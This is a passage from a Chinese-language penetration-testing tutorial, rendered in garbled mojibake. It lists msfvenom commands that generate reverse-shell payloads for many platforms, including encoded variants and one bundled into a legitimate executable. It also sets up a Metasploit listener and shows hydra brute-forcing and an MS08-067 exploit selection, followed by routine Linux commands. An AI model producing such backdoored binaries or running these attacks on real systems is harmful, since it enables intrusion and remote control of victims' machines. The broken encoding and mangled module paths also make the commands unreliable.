â€¦â€¦ - show #è¿™ä¸ªå‘½ä»¤ç”¨çš„å¾ˆå¤šã€‚å¦‚æœå•çº¯çš„è¾“å…¥showï¼Œé‚£ä¹ˆå°±ä¼šæ˜¾ç¤ºå‡ºæ‰€æœ‰çš„payloadï¼Œåˆ©ç”¨æ¨¡å—ï¼Œpostæ¨¡å—ï¼Œæ’ä»¶ç­‰ç­‰ã€‚ä½†æ˜¯ä¸€èˆ¬æˆ‘ä»¬éƒ½ä¸è¿™ä¹ˆä½¿ç”¨ã€‚å¦‚æœè¦æ˜¾ç¤ºåˆ©ç”¨æ¨¡å—ï¼Œé‚£ä¹ˆå°±è¾“å…¥show exploitsã€‚å¦‚æœè¦æ˜¾ç¤ºpayloadï¼Œé‚£ä¹ˆå°±è¾“å…¥show payloadsã€‚ 4-1-4 å®æˆ˜é€šè¿‡msfåˆ¶ä½œåå¼¹é“¾æ¥ï¼Œå³php æ¸—é€æ–‡ä»¶: msfvenom -p phpmeterpreterreverse_tcp lhost192.168.78.129 lport8080 -o venom.php åˆ—ä¸¾å¸¸ç”¨çš„å¹³å°æˆ–è¯­è¨€çš„æ”»å‡»æ–‡ä»¶ç”Ÿæˆå‘½ä»¤ ## æ™®é€šç”Ÿæˆï¼š msfvenom -p windowsmeterpreterreverse_tcp -f exe -o C:\\back.exe ## ç¼–ç å¤„ç†å‹ï¼š msfvenom -p windowsmeterpreterreverse_tcp -i 3 -e x86shikata_ga_na -f exe -o C:\\back.exe ## æ†ç»‘ï¼š msfvenom -p windowsmeterpreterreverse_tcp -platform windows -a x86 -x C: omal.exe -k -f exe -o C:\\shell.exe ## Windows: msfvenom -platform windows -a x86 -p windowsx64meterpreterreverse_tcp -f exe -o C:\\back.exe ## Linux: msfvenom -p linux86meterpreterreverse_tcp LHOST LPORT -f elf shell.elf ## MAC: msfvenom -p osxx86shelLreverse_tcp LHOST LPORT -f macho shell.macho ## PHP: msfvenom -p phpmeterpreterreverse_tcp LHOST LPORT -f raw shell.php ## AsP: msfvenom -p windowsmeterpreterreverse_tcp LHOST LPORT -f asp shell.asp ## Aspx: msfvenom -p windowsmeterpreterreverse_tcp LHOST LPORT -f asp shell.aspx ## JSP: msfvenom - p javajsp_shellreverse_tcp LHOST LPORT -f raw shell.jsp ## Warï¼š msfvenom -p javajsp_shelLreverse_tcp LHOST LPORT -f war shell.war ## Bash: msfvenom -p cmdunixreverse_bash LHOST LPORT -f raw shell.sh ## Perl: msfvenom -p cmdunixreverse_perl LHOST LPORT -f raw shell.pl ## Python: msfvenom -p pythonmeterpreterreverser_tcp LHOST LPORT -f raw shell.py ç›‘å¬ æ‰“å¼€å¦å¤–ä¸€ä¸ªç»ˆç«¯ï¼Œå¯åŠ¨msfæ§åˆ¶é¢æ¿ï¼Œå¯åŠ¨å¦‚æ–‡é¦–ä¸€å†…çš„msfconsoleç®€ä»‹ï¼Œåœ¨msfæ§åˆ¶é¢æ¿ä¾æ¬¡è¾“å…¥ä»¥ä¸‹å‘½ä»¤ï¼š use exploitmultihandler #ä½¿ç”¨ç›‘å¬æ¨¡å— set payload phpmeterpreterreverse_tcp #è®¾ç½®tcp_phpçš„åå¼¹é“¾æ¥ï¼Œå’Œæ¸—é€æ–‡ä»¶çš„payloadä¿æŒä¸€è‡´ set lhost 192.168.78.129 #æœ¬æœºipï¼Œä¸ç”Ÿæˆæ¸—é€æ–‡ä»¶çš„hostä¿æŒä¸€è‡´ set lport 8080 #æœ¬æœºç«¯å£ï¼Œä¸ç”Ÿæˆæ¸—é€æ–‡ä»¶ä¿æŒä¸€è‡´ exploit 4-2 å¸¸ç”¨å‘½ä»¤ls dev -alh â€“sortsize â€“ ## é•¿åˆ—è¡¨å±•ç¤ºdevç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶ï¼Œç›´è§‚å±•ç¤ºæ–‡ä»¶å¤§å°å¹¶æŒ‰ç…§æ–‡ä»¶å¤§å°è¿›è¡Œæ’åº less : â€”â€”â€”â€”â€”â€”â€”â€“ ## ä»å¤´åˆ°å°¾,åªå±•ç¤ºæœ«å°¾ä¸€æ®µå æ»¡çª—å£å†…å®¹ï¼ŒæŒ‰qé€€å‡º tail : â€”â€”â€”â€”â€”â€”â€”â€“ ## é»˜è®¤å±•ç¤º10è¡Œå†…å®¹ top: â€”â€”â€”â€”â€” ## æŸ¥çœ‹ç³»ç»Ÿèµ„æºå ç”¨æƒ…å†µ df: â€”â€”â€”â€”â€”â€”â€”â€” ## æŸ¥çœ‹ç£ç›˜åˆ†åŒºä»¥åŠæŒ‚è½½ç‚¹ç©ºé—´å ç”¨æƒ…å†µ df -h ~ -h ç›´è§‚çš„å±•ç¤ºæ–‡ä»¶å¤§å°(æ ‡æ³¨æ–‡ä»¶å¤§å°å•ä½K,M,G) free: ## æŸ¥çœ‹å½“å‰ç³»ç»Ÿå†…å­˜ä½¿ç”¨æƒ…å†µ free -h #æ˜¾ç¤ºå†…å­˜å ç”¨æƒ…å†µå¹¶æ˜¾ç¤ºå•ä½ ifconfig: ## æŸ¥çœ‹ç½‘å¡ä¿¡æ¯æˆ–è€…å¯¹ç½‘å¡è¿›è¡Œæ“ä½œ fconfig eth0 down â€”â€”â€”â€”â€”â€”- åœæ‰eth0ç½‘å¡ ifconfig eth0 up â€”â€”â€”â€”â€” å¼€å¯eth0ç½‘å¡ 4-2-1 apt-getsudo apt-get update # æ›´æ–°è½¯ä»¶åŒ…åˆ—è¡¨ sudo apt-get upgrade # æ›´æ–°å·²å®‰è£…è½¯ä»¶åŒ… sudo apt-get install # å®‰è£…è½¯ä»¶åŒ… sudo apt-get remove # åˆ é™¤è½¯ä»¶åŒ… 4-2-2 ifconfigifconfig # æ˜¾ç¤ºç½‘ç»œæ¥å£çš„è¯¦ç»†ä¿¡æ¯ ifconfig eth0 # æ˜¾ç¤ºeth0ç½‘ç»œæ¥å£çš„è¯¦ç»†ä¿¡æ¯ ifconfig eth0 up # å¯ç”¨eth0ç½‘ç»œæ¥å£ ifconfig eth0 down # ç¦ç”¨eth0ç½‘ç»œæ¥å£ 4-2-3 netstatnetstat # æ˜¾ç¤ºæ‰€æœ‰ç½‘ç»œè¿æ¥ä¿¡æ¯ netstat -t # æ˜¾ç¤ºTCPåè®®çš„ç½‘ç»œè¿æ¥ä¿¡æ¯ netstat -u # æ˜¾ç¤ºUDPåè®®çš„ç½‘ç»œè¿æ¥ä¿¡æ¯ netstat -a # æ˜¾ç¤ºæ‰€æœ‰ç½‘ç»œè¿æ¥ä¿¡æ¯ï¼ŒåŒ…æ‹¬å·²å…³é—­çš„è¿æ¥ 4-2-4 pingping www.google.com # å‘é€pingè¯·æ±‚åˆ°www.google.com ping -c 5 192.168.0.1 # å‘é€5ä¸ªpingè¯·æ±‚åˆ°192.168.0.1ä¸»æœº 4-2-5 sshssh root@192.168.0.1 # è¿æ¥åˆ°192.168.0.1ä¸»æœºä¸Šçš„rootç”¨æˆ· ssh -p 2222 root@192.168.0.1 # è¿æ¥åˆ°2222ç«¯å£ä¸Šçš„192.168.0.1ä¸»æœºä¸Šçš„rootç”¨æˆ· 4-2-6 nmapnmap 192.168.0.024 # æ‰«æ192.168.0.024ç½‘ç»œä¸Šçš„æ‰€æœ‰ä¸»æœº nmap -p 1-1000 192.168.0.1 # æ‰«æ192.168.0.1ä¸»æœºä¸Šçš„1-1000ç«¯å£ 4-2-7 hydrahydra -l admin -P password.txt ftp://192.168.0.1 # åœ¨192.168.0.1ä¸»æœºä¸Šä½¿ç”¨password.txtä¸­çš„å¯†ç å°è¯•ç™»å½•ftpæœåŠ¡å™¨ï¼Œç”¨æˆ·åä¸ºadmin 4-2-8 metasploitmetasploitå‘½ä»¤æ˜¯ä¸€ä¸ªæ¸—é€æµ‹è¯•æ¡†æ¶ï¼Œå®ƒåŒ…å«äº†è®¸å¤šæœ‰ç”¨çš„æ¼æ´åˆ©ç”¨å·¥å…·å’Œè·è½½ã€‚å®ƒå¯ä»¥å¸®åŠ©æ‚¨æµ‹è¯•ç½‘ç»œå®‰å…¨ï¼Œå¹¶å‘ç°ç³»ç»Ÿä¸­çš„æ¼æ´ã€‚ msfconsole # æ‰“å¼€metasploitæ§åˆ¶å° search smb # åœ¨metasploitä¸­æœç´¢SMBæ¼æ´ use exploitwindowssmbms08_067_netapi # ä½¿ç”¨ms08_067_netapiæ¼æ´åˆ©ç”¨æ”»å‡»windowsç³»ç»Ÿ 4-2-9 toptop # æ˜¾ç¤ºæ­£åœ¨è¿è¡Œçš„è¿›ç¨‹åˆ—è¡¨ top -u root # æ˜¾ç¤ºä»¥rootç”¨æˆ·è¿è¡Œçš„è¿›ç¨‹åˆ—è¡¨ 4-2-10 psps -ef # æ˜¾ç¤ºæ‰€æœ‰æ­£åœ¨è¿è¡Œçš„è¿›ç¨‹ ps -u root # æ˜¾ç¤ºä»¥rootç”¨æˆ·è¿è¡Œçš„è¿›ç¨‹ ps -aux # åˆ—å‡ºæ‰€æœ‰è¿›ç¨‹ï¼Œå¹¶æ˜¾ç¤ºæ›´è¯¦ç»†çš„ä¿¡æ¯ -a æ˜¾ç¤ºå½“å‰ç»ˆç«¯å…³è”çš„æ‰€æœ‰è¿›ç¨‹ -u åŸºäºç”¨æˆ·æ ¼å¼æ˜¾ç¤º -x æ˜¾ç¤ºæ‰€æœ‰è¿›ç¨‹ -e è¡¨ç¤ºæ‰€æœ‰çš„è¿›ç¨‹ -f å®Œæ•´æ ¼å¼çš„è¾“å‡º ## STAT è¿›ç¨‹çŠ¶æ€ R ## æ­£åœ¨è¿è¡Œ S ## æ­£åœ¨ç¡çœ  T ## æ­£åœ¨ä¾¦æµ‹æˆ–åœæ­¢ Z ## åƒµå°¸è¿›ç¨‹ï¼ˆè¿™ä¸ªè¿›ç¨‹æ­»äº†ï¼Œä½†æ˜¯æ— æ³•åœæ‰çˆ¶è¿›ç¨‹ï¼‰ D ## ä¸å¯ç»ˆç«¯çš„çŠ¶æ€ ## ç‰¹æ®Šçš„çŠ¶æ€ S ## è¡¨ç¤ºä¼˜å…ˆçº§æ¯”è¾ƒé«˜ SN ## è¡¨ç¤ºä¼˜å…ˆçº§æ¯”è¾ƒä½ s ## è¡¨ç¤ºè¿›ç¨‹æ˜¯æ§åˆ¶è¿›ç¨‹ L ## è¿›ç¨‹æœ‰é¡µé¢é”å®šåœ¨å†…å­˜ä¸­ I ## è¡¨ç¤ºè¿›ç¨‹æ˜¯å¤šçº¿ç¨‹ + ## è¡¨ç¤ºå½“å‰è¿›ç¨‹è¿è¡Œåœ¨å‰å° 4-2-11 dfdf # æ˜¾ç¤ºç³»ç»Ÿä¸­æ‰€æœ‰ç£ç›˜åˆ†åŒºçš„ä½¿ç”¨æƒ…å†µ df -h # æ˜¾ç¤ºäººç±»å¯è¯»çš„æ ¼å¼çš„ç£ç›˜ä½¿ç”¨æƒ…å†µ 4-2-12 awkcat file.txt | awk â€˜{print $1}â€™ # ä»file.txtæ–‡ä»¶ä¸­æå–ç¬¬ä¸€åˆ—æ•°æ® ps -ef | awk â€˜$3 1 {print $0}â€™ # æ˜¾ç¤ºä»¥PID 1çš„è¿›ç¨‹ä¸ºçˆ¶è¿›ç¨‹çš„è¿›ç¨‹åˆ—è¡¨"}]